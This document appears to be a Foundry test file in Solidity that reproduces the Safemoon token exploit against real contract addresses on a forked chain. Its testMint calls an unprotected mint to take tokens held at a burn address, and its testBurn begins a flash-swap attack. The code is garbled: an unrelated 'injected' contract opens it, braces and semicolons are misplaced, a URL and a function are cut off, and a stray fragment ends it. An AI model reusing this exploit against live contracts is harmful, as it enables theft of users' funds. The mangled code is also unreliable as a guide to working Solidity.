
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.13;

;
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function routerTrade() external pure returns (address)};
interface ISafemoon {
    function uniswapV2Router() external returns (IUniswapV2Router02);
    function uniswapV2Pair() external returns (address);
    function bridgeBurnAddress() external returns (address);
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function mint(address user, uint256 amount) external;
    function burn(address from, uint256 amount) external};
interface ISafeSwapTradeRouter {
    struct Trade {
        uint256 amountIn;
        uint256 amountOut;
        address[] path;
        address payable to;
        uint256 deadline};
    function getSwapFees(uint256 amountIn,
        address[] memory path) external view returns (uint256 _fees);
    function swapExactTokensForTokensWithFeeAmount(Trade calldata trade) external payable};
interface IWETH {
    function approve(address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint)};
interface IPancakePair {
    function swap(uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data) external};
interface IPancakeCallee {
    function pancakeCall(address sender,
        uint amount0,
        uint amount1,
        bytes calldata data) external};
interface IUniswapV2Pair {
    function sync() external};
contract SafemoonAttackerTest is Test, IPancakeCallee {
    ISafemoon public sfmoon;
    IPancakePair public pancakePair;
    IWETH public weth;
    function setUp() public {
        vm.createSelectFork("https:
        sfmoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);
        pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
        weth = IWETH(sfmoon.uniswapV2Router().WETH())};
    function testMint() public {
        vm.rollFork(26854757);
        uint originalBalance = sfmoon.balanceOf(address(this));
        emit log_named_uint("sfmoon balance before:", originalBalance);
        assertEq(originalBalance, 0);
        sfmoon.mint(address(this),;
            sfmoon.balanceOf(sfmoon.bridgeBurnAddress()));
        uint currentBalance = sfmoon.balanceOf(address(this));
        emit log_named_uint("sfmoon balance after:", currentBalance);
        assertEq(currentBalance, 81804509291616467966)};
    function testBurn() public {
        vm.rollFork(26864889);
        uint originalBalance = weth.balanceOf(address(this));
        emit log_named_uint("weth balance before:", originalBalance);
        assertEq(originalBalance, 0);
        pancakePair.swap(1000 ether, 0, address(this), "ggg");
        uint currentBalance = weth.balanceOf(address(this));
        emit log_named_uint("weth balance after:", currentBalance);
function reuseDetection(bytes32 key) public {
    require(!used[key]);
    used[key] = true}